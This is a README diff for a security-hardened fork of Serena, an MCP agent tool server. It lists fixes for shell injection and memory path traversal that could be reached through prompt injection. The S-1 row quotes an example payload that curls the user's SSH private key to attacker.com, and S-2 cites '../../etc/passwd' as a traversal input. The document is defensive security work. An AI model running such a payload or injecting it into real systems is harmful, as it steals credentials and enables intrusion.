@@ -42,6 +42,25 @@ In general, Serena can be integrated with an LLM in several ways:
 * by incorporating Serena's tools into an agent framework of your choice, as illustrated [here](docs/03-special-guides/custom_agent.md).
   Serena's tool implementation is decoupled from the framework-specific code and can thus easily be adapted to any agent framework.
 
+## This Fork
+
+**Upstream:** [oraios/serena](https://github.com/oraios/serena) — forked as [celstnblacc/serena](https://github.com/celstnblacc/serena) for use in the [token-diet](https://github.com/celstnblacc/token-diet) stack.
+
+**Why we forked:** Serena runs as an MCP server with access to the filesystem and a shell executor. The upstream `execute_shell_command` passed user-controlled strings directly to `subprocess.Popen(shell=True)`, and the memory system did not validate paths before constructing file paths — both enabling data exfiltration or arbitrary command execution via prompt injection.
+
+**Security fixes applied (v0.1.4+):**
+
+| Severity | ID | Fix |
+|----------|----|-----|
+| HIGH | S-1 | **Shell injection via `shell=True`** — `execute_shell_command` in `util/shell.py` passed the raw command string to `Popen(shell=True)`. A prompt-injected payload like `list files ; curl attacker.com/exfil?d=$(cat ~/.ssh/id_rsa)` would execute both commands. Added `_SHELL_METACHAR_RE` guard that raises `ValueError` on `;`, `\|`, `&`, `` ` ``, `$(`. |
+| MEDIUM | S-2 | **Memory path traversal** — `MemoriesManager.get_memory_file_path` in `project.py` joined user-controlled name segments without resolving the path. A name like `../../etc/passwd` passed the `startswith` check but resolved outside the memory directory. Fixed with `Path.resolve()` + `relative_to()` validation before returning any memory path. |
+| LOW | S-3 | **`pywebview` unpinned** — already addressed upstream via `[tool.uv.sources]` pin to a specific git commit. No change required. |
+| LOW | S-4 | **Flask dashboard unauthenticated** — default binding is `127.0.0.1` (not `0.0.0.0`). Accepted risk; documented with a test that locks in the localhost default. |
+
+New test file: `test/serena/test_security.py` (21 tests). Run `pytest test/serena/test_security.py` to verify.
+
+---
+
 ## Serena in Action
 
 #### Demonstration 1: Efficient Operation in Claude Code
